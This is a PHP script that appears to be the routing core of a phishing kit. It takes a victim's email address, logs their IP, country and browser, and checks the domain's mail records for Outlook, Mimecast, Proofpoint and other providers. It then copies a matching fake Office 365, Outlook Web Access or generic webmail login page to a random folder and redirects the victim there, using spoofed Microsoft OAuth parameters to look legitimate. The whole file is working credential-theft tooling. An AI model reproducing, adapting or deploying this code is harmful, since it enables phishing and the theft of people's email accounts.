<?php
include('engine/encrypt.php');
include('engine/owaf.php');
include('blocker.php');
include('config.php');

function RandNumber($randstr)
{
    $char = '0123456789';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};

function RandString($randstr)
{
    $char = 'abcdefghijklmnopqrstuvwxyz';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};

function getOS($user_agent = null)
{
    if(!isset($user_agent) && isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
    }

    // https://stackoverflow.com/questions/18070154/get-operating-system-info-with-php
    $os_array = [
        'windows nt 10'                              =>  'Windows 10',
        'windows nt 6.3'                             =>  'Windows 8.1',
        'windows nt 6.2'                             =>  'Windows 8',
        'windows nt 6.1|windows nt 7.0'              =>  'Windows 7',
        'windows nt 6.0'                             =>  'Windows Vista',
        'windows nt 5.2'                             =>  'Windows Server 2003/XP x64',
        'windows nt 5.1'                             =>  'Windows XP',
        'windows xp'                                 =>  'Windows XP',
        'windows nt 5.0|windows nt5.1|windows 2000'  =>  'Windows 2000',
        'windows me'                                 =>  'Windows ME',
        'windows nt 4.0|winnt4.0'                    =>  'Windows NT',
        'windows ce'                                 =>  'Windows CE',
        'windows 98|win98'                           =>  'Windows 98',
        'windows 95|win95'                           =>  'Windows 95',
        'win16'                                      =>  'Windows 3.11',
        'mac os x 10.1[^0-9]'                        =>  'Mac OS X Puma',
        'macintosh|mac os x'                         =>  'Mac OS X',
        'mac_powerpc'                                =>  'Mac OS 9',
        'linux'                                      =>  'Linux',
        'ubuntu'                                     =>  'Linux - Ubuntu',
        'iphone'                                     =>  'iPhone',
        'ipod'                                       =>  'iPod',
        'ipad'                                       =>  'iPad',
        'android'                                    =>  'Android',
        'blackberry'                                 =>  'BlackBerry',
        'webos'                                      =>  'Mobile',

        '(media center pc).([0-9]{1,2}\.[0-9]{1,2})'=>'Windows Media Center',
        '(win)([0-9]{1,2}\.[0-9x]{1,2})'=>'Windows',
        '(win)([0-9]{2})'=>'Windows',
        '(windows)([0-9x]{2})'=>'Windows',

        // Doesn't seem like these are necessary...not totally sure though..
        //'(winnt)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'Windows NT',
        //'(windows nt)(([0-9]{1,2}\.[0-9]{1,2}){0,1})'=>'Windows NT', // fix by bg

        'Win 9x 4.90'=>'Windows ME',
        '(windows)([0-9]{1,2}\.[0-9]{1,2})'=>'Windows',
        'win32'=>'Windows',
        '(java)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2})'=>'Java',
        '(Solaris)([0-9]{1,2}\.[0-9x]{1,2}){0,1}'=>'Solaris',
        'dos x86'=>'DOS',
        'Mac OS X'=>'Mac OS X',
        'Mac_PowerPC'=>'Macintosh PowerPC',
        '(mac|Macintosh)'=>'Mac OS',
        '(sunos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'SunOS',
        '(beos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'BeOS',
        '(risc os)([0-9]{1,2}\.[0-9]{1,2})'=>'RISC OS',
        'unix'=>'Unix',
        'os/2'=>'OS/2',
        'freebsd'=>'FreeBSD',
        'openbsd'=>'OpenBSD',
        'netbsd'=>'NetBSD',
        'irix'=>'IRIX',
        'plan9'=>'Plan9',
        'osf'=>'OSF',
        'aix'=>'AIX',
        'GNU Hurd'=>'GNU Hurd',
        '(fedora)'=>'Linux - Fedora',
        '(kubuntu)'=>'Linux - Kubuntu',
        '(ubuntu)'=>'Linux - Ubuntu',
        '(debian)'=>'Linux - Debian',
        '(CentOS)'=>'Linux - CentOS',
        '(Mandriva).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - Mandriva',
        '(SUSE).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - SUSE',
        '(Dropline)'=>'Linux - Slackware (Dropline GNOME)',
        '(ASPLinux)'=>'Linux - ASPLinux',
        '(Red Hat)'=>'Linux - Red Hat',
        // Loads of Linux machines will be detected as unix.
        // Actually, all of the linux machines I've checked have the 'X11' in the User Agent.
        //'X11'=>'Unix',
        '(linux)'=>'Linux',
        '(amigaos)([0-9]{1,2}\.[0-9]{1,2})'=>'AmigaOS',
        'amiga-aweb'=>'AmigaOS',
        'amiga'=>'Amiga',
        'AvantGo'=>'PalmOS',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1}-([0-9]{1,2}) i([0-9]{1})86){1}'=>'Linux',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1} i([0-9]{1}86)){1}'=>'Linux',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1})'=>'Linux',
        '[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3})'=>'Linux',
        '(webtv)/([0-9]{1,2}\.[0-9]{1,2})'=>'WebTV',
        'Dreamcast'=>'Dreamcast OS',
        'GetRight'=>'Windows',
        'go!zilla'=>'Windows',
        'gozilla'=>'Windows',
        'gulliver'=>'Windows',
        'ia archiver'=>'Windows',
        'NetPositive'=>'Windows',
        'mass downloader'=>'Windows',
        'microsoft'=>'Windows',
        'offline explorer'=>'Windows',
        'teleport'=>'Windows',
        'web downloader'=>'Windows',
        'webcapture'=>'Windows',
        'webcollage'=>'Windows',
        'webcopier'=>'Windows',
        'webstripper'=>'Windows',
        'webzip'=>'Windows',
        'wget'=>'Windows',
        'Java'=>'Unknown',
        'flashget'=>'Windows',

        // delete next line if the script show not the right OS
        //'(PHP)/([0-9]{1,2}.[0-9]{1,2})'=>'PHP',
        'MS FrontPage'=>'Windows',
        '(msproxy)/([0-9]{1,2}.[0-9]{1,2})'=>'Windows',
        '(msie)([0-9]{1,2}.[0-9]{1,2})'=>'Windows',
        'libwww-perl'=>'Unix',
        'UP.Browser'=>'Windows CE',
        'NetAnts'=>'Windows',
    ];

    // https://github.com/ahmad-sa3d/php-useragent/blob/master/core/user_agent.php
    $arch_regex = '/\b(x86_64|x86-64|Win64|WOW64|x64|ia64|amd64|ppc64|sparc64|IRIX64)\b/ix';
    $arch = preg_match($arch_regex, $user_agent) ? '64' : '32';

    foreach ($os_array as $regex => $value) {
        if (preg_match('{\b('.$regex.')\b}i', $user_agent)) {
            return $value.' x'.$arch;
        }
    }

    return 'Unknown';
}

class geoPlugin {
	
	//the geoPlugin server
	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function geoPlugin() {

	}
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		
		//set the geoPlugin vars
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
	
	function convert($amount, $float=2, $symbol=true) {
		
		//easily convert amounts to geolocated currency.
		if ( !is_numeric($this->currencyConverter) || $this->currencyConverter == 0 ) {
			trigger_error('geoPlugin class Notice: currencyConverter has no value.', E_USER_NOTICE);
			return $amount;
		}
		if ( !is_numeric($amount) ) {
			trigger_error ('geoPlugin class Warning: The amount passed to geoPlugin::convert is not numeric.', E_USER_WARNING);
			return $amount;
		}
		if ( $symbol === true ) {
			return $this->currencySymbol . round( ($amount * $this->currencyConverter), $float );
		} else {
			return round( ($amount * $this->currencyConverter), $float );
		}
	}
	
	function nearby($radius=10, $limit=null) {

		if ( !is_numeric($this->latitude) || !is_numeric($this->longitude) ) {
			trigger_error ('geoPlugin class Warning: Incorrect latitude or longitude values.', E_USER_NOTICE);
			return array( array() );
		}
		
		$host = "http://www.geoplugin.net/extras/nearby.gp?lat=" . $this->latitude . "&long=" . $this->longitude . "&radius={$radius}";
		
		if ( is_numeric($limit) )
			$host .= "&limit={$limit}";
			
		return unserialize( $this->fetch($host) );

	}

	
}

//SCRIPT STARTS HERE

//check txt for office spf
function searchtxt($domain){ 
$result = array();
$result = dns_get_record($domain, DNS_TXT);
$b = $result[0]['txt']." ".$result[1]['txt']." ".$result[2]['txt']." ".$result[3]['txt']." ".$result[4]['txt']." ".$result[5]['txt']." ".$result[6]['txt']." ".$result[7]['txt']." ".$result[8]['txt']." ".$result[9]['txt']." ".$result[10]['txt']." ".$result[11]['txt']." ".$result[12]['txt']." ".$result[13]['txt']." ".$result[14]['txt']." ".$result[15]['txt']." ".$result[16]['txt'];
$c = strtolower($b);
return strpos($c, 'spf.protection.outlook.com');
}

if(empty($_POST['token']))
{
header("location: ../../");
exit;
}
// redirect bad mails
if (!filter_var(strtolower($_POST['token']), FILTER_VALIDATE_EMAIL)) {
header("location: $redirect");
exit;
}
$geoplugin = new geoPlugin();
$geoplugin->locate();
require_once('engine/Browser.php');
$browsers = new Browser();
$b_name = $browsers->getBrowser();
$b_plat = getOS();
$b_ver = $browsers->getVersion();

$browser = $b_name.":".$b_ver." on ".$b_plat;

//check visit

$searchterm =  strtolower($_POST['token']);
if ($multi_visit == 1){
$visitors = file_get_contents('visitors.txt');
}
$finger = $searchterm."-".$_SERVER['REMOTE_ADDR'];
//$searchtermfinger = md5(implode('',$finger));

$fp = fopen("visits.csv", "a");
	fputs($fp, "\"".$searchterm."\",\"".$_SERVER['REMOTE_ADDR']."\",\"{$geoplugin->countryName}\",\"".$browser."\"\r\n");
	fclose($fp);

if(strpos($visitors, "$searchterm") !== false)

{
	
header("location: ../../");

}else{
	$fp = fopen("visitors.txt", "a");
	fputs($fp, "".$searchterm."\r\n");
	fclose($fp);


$iptoken = base64_encode(doDecrypt($_POST['ip']));
$token_kr = urlencode(doEncrypt($_POST['token']));
$random=rand(0,1000000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) { 
$dir = opendir($src); 
@mkdir($dst); 
while(false !== ( $file = readdir($dir)) ) { 
if (( $file != '.' ) && ( $file != '..' )) { 
if ( is_dir($src . '/' . $file) ) { 
recurse_copy($src . '/' . $file,$dst . '/' . $file); 
} 
else { 
copy($src . '/' . $file,$dst . '/' . $file); 
} 
} 
} 
closedir($dir); 
}

$email = strtolower($_POST['token']);
///
$cookie_name = "xlogin";
$cookie_value = base64_encode($email);
setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day
setcookie("ip", $iptoken, time() + (86400 * 30), "/"); // 86400 = 1 day
///
$atdomain = strstr($email, '@');
$domain = str_replace("@","",$atdomain);

$hosts = array();
getmxrr($domain, $hosts);
$owac = check_owa($domain);
$a = strtolower($hosts[0]);

if (strpos($a, 'outlook') !== false || searchtxt($domain)!== false) {
    $src="office";
	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
	$token = $token_kr;
	recurse_copy( $src, $dst );
	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
}
elseif (strpos($a, 'mimecast') !== false)
	{
if ($owac == 'new exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'other exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'old exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
else {
	$src="office";
	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
	$token = $token_kr;
	recurse_copy( $src, $dst );
	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
}
}
elseif (strpos($a, 'pphosted') !== false)
	{
if ($owac == 'new exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'other exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'old exchange'){
	$src="oldowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
else {
	$src="office";
	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
	$token = $token_kr;
	recurse_copy( $src, $dst );
	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
}
}
elseif (strpos($a, 'iphmx') !== false)
	{
if ($owac == 'new exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'other exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'old exchange'){
	$src="oldowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
else {
	$src="office";
	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
	$token = $token_kr;
	recurse_copy( $src, $dst );
	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
}
}
elseif (strpos($a, 'yahoo.com') !== false){
	$src="domain";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");
}
elseif (strpos($a, 'emailsrvr.com') !== false){
	$src="domain";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");
}
elseif (strpos($a, 'smtp.secureserver.net') !== false){
	$src="domain";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");
}
elseif ($owac == 'new exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'other exchange'){
	$src="newowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
elseif ($owac == 'old exchange'){
	$src="oldowa";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");	
}
else {
	if ($general_page == 1){
	$src="domain";
	recurse_copy( $src, $dst );
	header("Location: $dst/load.php?token=$token_kr");
	}
	else{
		
	$src="office";
	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
	$token = $token_kr;
	recurse_copy( $src, $dst );
	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
		
	}
}


/* $src="domain";
recurse_copy( $src, $dst );
header("Location: $dst/load.php?token=$token_kr"); */
}
?>
